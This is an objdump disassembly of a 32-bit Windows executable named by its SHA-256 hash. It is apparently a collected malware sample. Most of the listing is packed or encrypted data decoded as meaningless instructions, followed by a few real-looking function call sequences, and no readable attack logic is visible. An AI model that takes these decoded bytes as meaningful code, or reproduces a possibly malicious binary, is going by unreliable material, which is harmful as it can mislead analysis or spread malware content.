
2e7c29b4c2062a484df58d981262172dc84ffce4520382bdb39eb0329a9d4f5d.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	mov    ebp,0xa20fa2be
  4d0005:	mov    al,ds:0xe8b8d25
  4d000a:	inc    edi
  4d000b:	push   ebp
  4d000c:	mov    DWORD PTR [ebx+0x4d120b0b],ebp
  4d0012:	out    dx,al
  4d0013:	mov    eax,0x11c8640c
  4d0018:	inc    ebp
  4d0019:	hlt    
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	and    bh,BYTE PTR [ebx]
  4d06c2:	jo     0x4d0704
  4d06c4:	xor    bl,BYTE PTR [ebp+0x5a9503e5]
  4d06ca:	pop    ecx
  4d06cb:	xchg   ebx,eax
  4d06cc:	pop    bp
  4d06ce:	shl    edi,1
  4d06d0:	in     al,dx
  4d06d1:	pop    edi
  4d06d2:	stc    
  4d06d3:	sbb    al,0xc
  4d06d5:	xor    esp,DWORD PTR [esi-0x4d]
  4d06d8:	sar    BYTE PTR [ebp-0x4540824b],1
  4d06de:	outs   dx,DWORD PTR ds:[esi]
  4d06df:	cmp    eax,0x330dbd02
  4d06e4:	cs xchg ecx,eax
  4d06e6:	sub    al,0x4f
  4d06e8:	mov    esi,0x5fee1f53
  4d06ed:	call   DWORD PTR ds:0x4d2004
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x40
  4d0700:	lea    eax,[esi-0xb0]
  4d0706:	mov    DWORD PTR [eax+0x108],0x5b68
  4d0710:	push   eax
  4d0711:	push   DWORD PTR [eax+0x1c]
  4d0714:	push   ecx
  4d0715:	push   ebx
  4d0716:	push   ecx
  4d0717:	call   0x4d105c
  4d071c:	add    esp,0x10
  4d071f:	pop    eax
  4d0720:	push   eax
  4d0721:	push   0x0
  4d0723:	call   0x4d12d4
  4d0728:	add    esp,0x4
  4d072b:	pop    eax
  4d072c:	push   eax
  4d072d:	call   0x4d1228
  4d0732:	add    esp,0x4
  4d0735:	pop    eax
  4d0736:	add    esp,0x40
  4d0739:	pop    ebp
  4d073a:	ret    
  4d073b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0741:	sub    esp,0x2c
  4d0744:	lea    ebx,[esi-0x6c]
  4d0747:	xor    ecx,DWORD PTR [ebp-0x8]
  4d074a:	mov    esi,0x0
  4d074f:	push   esi
  4d0750:	call   0x4d12d4
  4d0755:	add    esp,0x4
  4d0758:	push   ebx
  4d0759:	push   DWORD PTR [ebx+0x4]
  4d075c:	push   esi
  4d075d:	call   0x4d1494
  4d0762:	add    esp,0x8
  4d0765:	pop    ebx
  4d0766:	mov    eax,0xfffffff4
  4d076b:	push   eax
  4d076c:	call   0x4d142c
  4d0771:	add    esp,0x4
  4d0774:	add    esp,0x2c
  4d0777:	pop    ebp
  4d0778:	ret    
  4d0779:	add    BYTE PTR [eax],al
  4d077b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0781:	sub    esp,0x24
  4d0784:	lea    edi,[edx+0xfc]
  4d078a:	and    ecx,esi
  4d078c:	push   edi
  4d078d:	push   ecx
  4d078e:	push   eax
  4d078f:	push   edx
  4d0790:	call   0x4d0838
